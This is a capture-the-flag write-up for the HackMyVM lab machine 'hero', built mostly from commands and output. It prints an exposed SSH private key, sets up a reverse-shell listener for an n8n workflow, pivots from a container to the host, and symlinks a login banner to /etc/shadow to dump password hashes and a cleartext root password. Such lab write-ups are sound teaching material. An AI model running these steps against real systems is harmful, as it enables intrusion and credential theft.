# hero

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| hero | sml | intermediate | HackMyVM |

**Summary:** The exploitation of the hero machine begins with a discovery of a sensitive OpenSSH private key exposed on a standard web server. This initial finding provides the necessary cryptographic material to eventually target the SSH service. Further enumeration reveals an instance of the n8n automation platform running on a non-standard port. By creating a custom workflow within n8n, an attacker can execute arbitrary commands on the underlying containerized environment to establish a reverse shell. Once inside the container, network discovery identifies the host machine, allowing for a pivot via SSH using the previously recovered private key. The final phase involves exploiting a misconfigured banner system that reads from a world-writable directory. By replacing the banner file with a symbolic link to the system shadow file, the root password hash is disclosed during a subsequent login session. This allows for a successful switch to the root user and full compromise of the system.

---

## Reconnaissance

The initial phase starts with a network sweep to identify the target IP address within the local subnet.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 23:44 WIB
Nmap scan report for 192.168.100.1
Host is up (0.00050s latency).
Nmap scan report for 192.168.100.2
Host is up (0.00063s latency).
Nmap scan report for 192.168.100.208
Host is up (0.0017s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 17.03 seconds
```

After locating the target at 192.168.100.208, a comprehensive port scan is performed to identify available services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ nmap -sS -p- -T4 -sC -sV 192.168.100.208
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 23:45 WIB
Nmap scan report for 192.168.100.208
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Site doesn't have a title (text/html).
5678/tcp open  rrac?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Sat, 23 May 2026 16:44:19 GMT
|     ETag: W/"7b7-19e55b92b60"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Sat, 23 May 2026 16:46:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-DfOJfMlf.js"></script>
|     <meta charset="utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
|     <link rel="icon" href="/favicon.ico" />
|     <style>@media (prefers-color-scheme: dark) { body { background-color: rgb(45, 46, 46) } }</style>
|     <script type="text/javascript">
|     window.BASE_PATH = '/';
|     window.REST_ENDPOINT = 'rest';
|     </script>
|     <script src="/rest/sentry.js"></script>
|     <script>!function(t,e){var o,n,
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Vary: Accept-Encoding
|     Date: Sat, 23 May 2026 16:46:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5678-TCP:V=7.95%I=7%D=5/23%Time=6A11D9E4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCach
SF:e-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Sat,\x2023\
SF:x20May\x202026\x2016:44:19\x20GMT\r\nETag:\x20W/\"7b7-19e55b92b60\"\r\n
SF:Content-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x201975
SF:\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sat,\x2023\x20May\x202026\x201
SF:6:46:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20crossorig
SF:in\x20src=\"/assets/polyfills-DfOJfMlf\.js\"></script>\n\n\t\t<meta\x20
SF:charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\"\x2
SF:0content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\
SF:"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"icon
SF:\"\x20href=\"/favicon\.ico\"\x20/>\n\t\t<style>@media\x20\(prefers-colo
SF:r-scheme:\x20dark\)\x20{\x20body\x20{\x20background-color:\x20rgb\(45,\
SF:x2046,\x2046\)\x20}\x20}</style>\n\t\t<script\x20type=\"text/javascript
SF:\">\n\t\t\twindow\.BASE_PATH\x20=\x20'/';\n\t\t\twindow\.REST_ENDPOINT\
SF:x20=\x20'rest';\n\t\t</script>\n\t\t<script\x20src=\"/rest/sentry\.js\"
SF:></script>\n\t\t<script>!function\(t,e\){var\x20o,n,")%r(HTTPOptions,18
SF:3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defa
SF:ult-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type
SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:\x20
SF:Accept-Encoding\r\nDate:\x20Sat,\x2023\x20May\x202026\x2016:46:26\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
SF:\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>
SF:\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTS
SF:PRequest,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nVary:\x20Accept-Encoding\r\nDate:\x20Sat,\x2023\x20May\x202026\x2016:
SF:46:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</titl
SF:e>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html
SF:>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
```

## Initial Access

1. Inspecting the web server on port 80 reveals an OpenSSH private key directly in the response body.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ curl -s 'http://192.168.100.208'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----
```

2. The key is saved to a file and properly secured with appropriate permissions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ curl -s 'http://192.168.100.208' > id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ ssh-keygen -l -f id_rsa
256 SHA256:4Bu9VvimE5IW8+f93tPh3/jpwc1VHy3wP4lpeV3S3SQ shawa@hero (ED25519)
```

3. Analysis of port 5678 indicates the presence of n8n, a workflow automation tool. Accessing the web interface allows for the creation of a new account and subsequent login.

![alt text](image.png)

4. A new workflow is constructed to facilitate remote command execution.

![alt text](image-1.png)

5. A netcat listener is established on the attacker machine to receive the incoming connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/hero]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

6. Upon executing the workflow, a reverse shell is successfully obtained.

![alt text](image-2.png)

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 62086
id
uid=1000(node) gid=1000(node) groups=1000(node)
```

## Internal Enumeration and Pivoting

1. The current environment is identified as a Docker container running Alpine Linux.

```bash
uname -a
Linux 83ed090ff160 6.12.11-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux
which script
which python3
which perl
which bash
which ruby
hostname
83ed090ff160
```

2. Network configuration shows the container IP address as 172.17.0.2.

```bash
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

3. Scanning the host gateway address 172.17.0.1 reveals that SSH and HTTP services are active.

```bash
for p in 22 80; do nc -zv -w 1 172.17.0.1 $p >/dev/null 2>&1 && echo "Port $p is OPEN" || echo "Port $p is CLOSED"; done
Port 22 is OPEN
Port 80 is OPEN
```

4. The previously discovered private key is recreated within the container to allow for an SSH connection to the host.

```bash
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----' > id_rsa ; chmod 600 id_rsa
ls -la
total 32
drwxr-sr-x    1 node     node          4096 May 23 17:56 .
drwxr-xr-x    1 root     root          4096 Jan 22  2025 ..
drwxr-sr-x    3 node     node          4096 Feb  6  2025 .cache
drwxr-sr-x    1 node     node          4096 May 24 04:16 .n8n
drwx--S---    2 node     node          4096 May 23 17:57 .ssh
-rw-------    1 node     node           399 May 24 04:25 id_rsa
```

5. A connection is established to the shawa user on the host machine.

```bash
ssh -i id_rsa -o StrictHostKeyChecking=no -tt shawa@172.17.0.1 -A
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hero:~$ ^[[40;9Rid
id
uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)
hero:~$ ^[[40;9Rnetstat -tulpn
netstat -tulpn
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 :::5678                 :::*                    LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
```

## Privilege Escalation

1. Investigation of the /opt directory reveals a world-writable directory containing a banner file.

```bash
hero:~$ ^[[27;9Rls -la /opt
ls -la /opt
total 16
drw-rw-rwx    3 root     root          4096 Feb  6  2025 .
drwxr-xr-x   21 root     root          4096 Feb  6  2025 ..
-rw-rw-rw-    1 root     root            16 Feb  6  2025 banner.txt
drwx--x--x    4 root     root          4096 Feb  6  2025 containerd
hero:~$ ^[[34;9Rcat /opt/banner.txt
cat /opt/banner.txt
shawa was here.
```

2. The banner file is replaced with a symbolic link to the system shadow file.

```bash
hero:~$ ^[[40;9Rrm /opt/banner.txt
rm /opt/banner.txt
hero:~$ ^[[40;9Rln -s /etc/shadow /opt/banner.txt
ln -s /etc/shadow /opt/banner.txt
```

3. By logging in again via SSH, the contents of the shadow file are displayed, revealing the root password hash and a cleartext password hint.

```bash
hero:~$ ^[[40;9Rssh -A shawa@172.17.0.1
ssh -A shawa@172.17.0.1
#Imthepassthaty0uwant!
root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::
bin:!::0:::::
daemon:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
games:!::0:::::
ntp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
klogd:!:20125:0:99999:7:::
chrony:!:20125:0:99999:7:::
nginx:!:20125:0:99999:7:::
shawa:$6$24FnSb8jAyKUSa4W$Z7fiPgCy1q8VTg6eF0tVe2cjlHfZEB.fswQyBWoZdY3PwV6VyckxP8OhskWf/Kgx881HhsT2uWvVPTGRpJ43T.:20125:0:99999:7:::
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hero:~$ ^[[40;9R
```

4. The password is used to escalate privileges to root.

```bash
hero:~$ ^[[40;9Rsu - root
su - root
Password: Imthepassthaty0uwant!

hero:~# ^[[40;9Rid;whoami;hostname
id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
root
hero
```

5. The flags are recovered from the respective home directories.

```bash
hero:~# ^[[40;9Rcat /home/shawa/user.txt
cat /home/shawa/user.txt
HMV[REDACTED]
hero:~# ^[[40;9Rcat /root/root.txt
cat /root/root.txt
HMV[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Scanning the network and identifying open ports on the target machine.
2. **Vulnerability Discovery**: Finding an exposed OpenSSH private key on the web server and identifying n8n.
3. **Exploitation**: Leveraging n8n workflows to execute a reverse shell and gain access to a Docker container.
4. **Internal Enumeration**: Identifying the host IP and pivoting to the host system via SSH using the recovered key.
5. **Privilege Escalation**: Utilizing a world-writable directory to symlink the shadow file into the login banner for password disclosure.

